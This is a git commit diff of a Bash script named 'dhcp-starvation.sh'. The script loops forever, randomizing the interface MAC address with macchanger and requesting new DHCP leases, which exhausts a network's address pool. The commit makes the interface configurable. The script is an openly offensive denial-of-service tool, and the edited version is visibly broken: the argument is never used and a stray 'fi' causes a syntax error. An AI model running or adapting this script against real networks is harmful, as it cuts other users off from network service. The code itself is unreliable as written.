3ab7f24c5d8b59936ef3d580d7c8b2916f9383ef
Àlex <37349590+superpep@users.noreply.github.com>
2022-01-27 19:33:48 +0100

    Added the ability to change the interface

--- dhcp-starvation.sh
+++ dhcp-starvation.sh
@@ -1,19 +1,24 @@
 #!/bin/bash
 
+if [[ -z $1 ]]; then
+   interface='eth0'
+fi
+
 while true; do
-   # We kill every dhclient process
-   killall dhclient
-   rm -f /var/run/dhclient.pid
+      # We kill every dhclient process
+      killall dhclient
+      rm -f /var/run/dhclient.pid
 
-   # We disable our interface
-   ifconfig eth0 down
+      # We disable our interface
+      ifconfig $interface down
 
-   # We switch our MAC address for out interface
-   echo $(macchanger -a eth0)
+      # We switch our MAC address for out interface
+      echo $(macchanger -a $interface)
 
-   # We enable again our interface
-   ifconfig eth0 up
+      # We enable again our interface
+      ifconfig $interface up
 
-   # We get a new DHCP Lease
-   dhclient eth0 2>&1 | grep DHCPACK
-done
+      # We get a new DHCP Lease
+      dhclient $interface 2>&1 | grep DHCPACK
+   done
+fi
